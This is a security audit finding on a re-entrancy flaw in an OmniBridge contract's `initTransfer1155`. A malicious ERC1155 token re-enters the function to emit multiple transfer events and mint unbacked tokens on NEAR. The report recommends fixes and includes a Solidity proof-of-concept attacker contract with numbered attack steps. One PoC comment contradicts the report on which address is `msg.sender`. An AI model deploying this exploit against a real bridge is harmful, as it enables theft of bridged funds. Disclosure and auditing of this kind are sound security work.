Audit Report

## Title
Re-entrancy in `initTransfer1155` via Malicious ERC1155 Token Enables Unauthorized Minting on NEAR — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` makes an external call to a fully attacker-controlled ERC1155 token contract with no re-entrancy guard. A malicious token's `safeTransferFrom` can re-enter `initTransfer1155` an arbitrary number of times before returning. Each re-entrant frame increments `currentOriginNonce` and emits a distinct `InitTransfer` event. Because the NEAR bridge deduplicates by `(origin_chain, origin_nonce)`, every event with a unique nonce is processed as an independent valid transfer, causing the NEAR side to mint bridged tokens for each re-entrant frame while the attacker deposits zero tokens on Ethereum.

## Finding Description

`initTransfer1155` (lines 439–490) follows this sequence:

1. `currentOriginNonce += 1` — nonce incremented before external call.
2. `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` — **external call to fully attacker-controlled contract**.
3. `initTransferExtension(...)` — optional extension hook.
4. `emit BridgeTypes.InitTransfer(...)` — event emitted **after** the external call. [1](#0-0) 

There is no `nonReentrant` modifier and no `ReentrancyGuardUpgradeable` in the inheritance chain (`UUPSUpgradeable`, `AccessControlUpgradeable`, `SelectivePausableUpgradable`, `IERC1155Receiver`). [2](#0-1) 

The `onERC1155Received` guard (`operator != address(this)`) does **not** prevent this attack. That guard only blocks direct ERC1155 sends to the bridge (where a third party calls `token.safeTransferFrom(from, bridge, ...)` directly). A malicious token's `safeTransferFrom` can re-enter `initTransfer1155` directly without ever invoking `onERC1155Received` on the bridge. [3](#0-2) 

**Re-entrancy call tree:**

```
attacker → bridge.initTransfer1155(malicious, id, 1, 0, 0, "attacker.near", "")
  currentOriginNonce → N
  malicious.safeTransferFrom(attacker, bridge, id, 1, "")
    malicious_token → bridge.initTransfer1155(malicious, id, 1, 0, 0, "attacker.near", "")
      currentOriginNonce → N+1
      malicious.safeTransferFrom(malicious_token, bridge, id, 1, "")
        … (repeat K times)
      emit InitTransfer(nonce=N+1)   ← unique nonce, passes NEAR dedup
  emit InitTransfer(nonce=N)         ← unique nonce, passes NEAR dedup
```

In re-entrant frames, `msg.sender` is the malicious token contract, but `recipient` is the attacker-controlled NEAR address passed in the call. With `nativeFee = 0` and `msg.value = 0`, `extensionValue = 0`, and the base `initTransferExtension` passes (`if (value != 0) revert InvalidValue()`). [4](#0-3) 

The NEAR side deduplicates `fin_transfer` calls by `(origin_chain, origin_nonce)` via `add_fin_transfer`. Because every re-entrant frame produces a **different** `currentOriginNonce`, every emitted event passes the NEAR-side deduplication check and triggers an independent mint. [5](#0-4) 

`logMetadata1155` is fully permissionless, so the attacker can register any token address before the attack. [6](#0-5) 

The CLAUDE.md security invariant "Event–transfer atomicity" is violated: `InitTransfer` is emitted in code paths where no tokens were actually locked (re-entrant frames deposit nothing), yet the NEAR side treats every emitted event as proof that tokens are held. [7](#0-6) 

## Impact Explanation

An attacker can emit K+1 `InitTransfer` events while depositing zero ERC1155 tokens on Ethereum. The NEAR bridge mints K+1 times the stated `amount` to the attacker's NEAR address. This constitutes **unauthorized minting and direct theft of bridged-token supply**, draining the bridge's token reserves on NEAR. This matches the Critical impact class: unauthorized minting / escrow mis-accounting of bridged funds.

## Likelihood Explanation

The attack is fully permissionless and requires no privileged access. Any EOA can deploy a malicious ERC1155 contract, call the permissionless `logMetadata1155` to register it, and then call `initTransfer1155`. No admin compromise, oracle manipulation, front-running, or external dependency failure is required. The attack is repeatable and scalable.

## Recommendation

1. Import and inherit `ReentrancyGuardUpgradeable` from OpenZeppelin and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`.
2. As defense-in-depth, emit `InitTransfer` **before** the external token call (full CEI compliance), consistent with the stated invariant in CLAUDE.md.
3. Optionally, validate that `tokenAddress` is a previously registered bridge token before calling into it, to reduce the attack surface from arbitrary external contracts.

## Proof of Concept

```solidity
// MaliciousERC1155.sol
contract MaliciousERC1155 {
    OmniBridge bridge;
    uint256 depth;

    function safeTransferFrom(
        address, address, uint256 id, uint256 amount, bytes calldata
    ) external {
        if (depth < 5) {
            depth++;
            // Re-enter: msg.sender here is the bridge, so bridge becomes msg.sender
            // in the re-entrant call, but recipient is still "attacker.near"
            bridge.initTransfer1155(
                address(this), id, uint128(amount), 0, 0, "attacker.near", ""
            );
            depth--;
        }
        // Never actually transfers tokens
    }

    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    // ... minimal ERC1155 stubs
}
```

**Steps:**
1. Deploy `MaliciousERC1155` pointing at the bridge.
2. Call `bridge.logMetadata1155(address(malicious), tokenId)` — permissionless.
3. Wait for NEAR to deploy a bridge token for the deterministic address.
4. Call `bridge.initTransfer1155(address(malicious), tokenId, 1, 0, 0, "attacker.near", "")` with `msg.value = 0`.
5. Re-entrancy fires 5 levels deep → 6 `InitTransfer` events emitted with nonces N … N+5.
6. NEAR processes all 6 events (each has a unique nonce, passing deduplication), minting 6 tokens to `attacker.near`.
7. Attacker deposited **0** ERC1155 tokens on Ethereum.

**File:** evm/CLAUDE.md (L34-36)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
- **No token release without signature**: Never mint, transfer, or unlock tokens to a recipient without first verifying a valid MPC signature. No admin function, emergency path, or refactor may bypass this — it is the only authorization gate for finTransfer
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```
